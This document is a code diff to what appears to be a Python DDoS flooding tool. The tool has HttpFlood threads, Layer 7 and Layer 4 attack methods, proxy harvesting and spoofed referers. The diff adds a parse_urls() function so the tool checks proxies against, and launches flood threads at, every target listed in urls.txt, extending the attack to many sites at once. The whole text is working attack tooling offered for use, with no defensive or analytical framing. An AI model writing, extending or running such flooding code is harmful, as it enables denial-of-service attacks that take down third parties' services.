@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+import logging
 from contextlib import suppress
 from itertools import cycle
 from json import load
@@ -250,8 +251,12 @@ class HttpFlood:
         self._target = target
         self._raw_target = (self._target.host, (self._target.port or 80))
 
-        if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (gethostbyname(self._target.host), (self._target.port or 80))
+        try:
+            if not self._target.host[len(self._target.host) - 1].isdigit():
+                self._raw_target = (gethostbyname(self._target.host), (self._target.port or 80))
+        except Exception as e:
+            print(self._target.host, self._target.port)
+            raise e
 
         if not referers:
             referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
@@ -875,6 +880,15 @@ class ToolsConsole:
         return {"success": False}
 
 
+def parse_urls():
+    data = []
+    with open("urls.txt") as urls_file:
+        data = urls_file.readlines()
+        urls_file.close()
+
+    return data
+
+
 if __name__ == '__main__':
     with open(currentDir / "config.json") as f:
         con = load(f)
@@ -896,7 +910,8 @@ if __name__ == '__main__':
                 if method in Methods.LAYER7_METHODS:
                     urlraw = argv[2].strip()
                     if not urlraw.startswith("http"): urlraw = "http://" + urlraw
-                    url = URL(urlraw)
+                    # url = URL(urlraw)
+                    urls = parse_urls()
                     threads = int(argv[4])
                     rpc = int(argv[6])
                     timer = int(argv[7])
@@ -925,15 +940,17 @@ if __name__ == '__main__':
                         with proxy_li.open("w") as wr:
                             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
                             print(f"{len(Proxies):,} Proxies are getting checked, this may take awhile !")
-                            Proxies = ProxyChecker.checkAll(Proxies, url.human_repr(), 1, threads)
-                            if not Proxies:
-                                exit(
-                                    "Proxy Check failed, Your network may be the problem | The target may not be"
-                                    " available.")
-                            stringBuilder = ""
-                            for proxy in Proxies:
-                                stringBuilder += (proxy.__str__() + "\n")
-                            wr.write(stringBuilder)
+                            for urlraw in urls:
+                                url = URL(urlraw)
+                                Proxies = ProxyChecker.checkAll(Proxies, url.human_repr(), 1, threads)
+                                if not Proxies:
+                                    exit(
+                                        "Proxy Check failed, Your network may be the problem | The target may not be"
+                                        " available.")
+                                stringBuilder = ""
+                                for proxy in Proxies:
+                                    stringBuilder += (proxy.__str__() + "\n")
+                                wr.write(stringBuilder)
 
                     proxies = ProxyUtiles.readFromFile(proxy_li)
                     if not proxies:
@@ -942,8 +959,10 @@ if __name__ == '__main__':
                     if proxies:
                         print(f"Proxy Count: {len(proxies):,}")
                     for _ in range(threads):
-                        Thread(target=HttpFlood, args=(url, method, rpc, event, uagents, referers, proxies,),
-                               daemon=True).start()
+                        for urlraw in urls:
+                            url = URL(urlraw)
+                            Thread(target=HttpFlood, args=(url, method, rpc, event, uagents, referers, proxies,),
+                                   daemon=True).start()
 
                 if method in Methods.LAYER4_METHODS:
                     target = argv[2].strip()
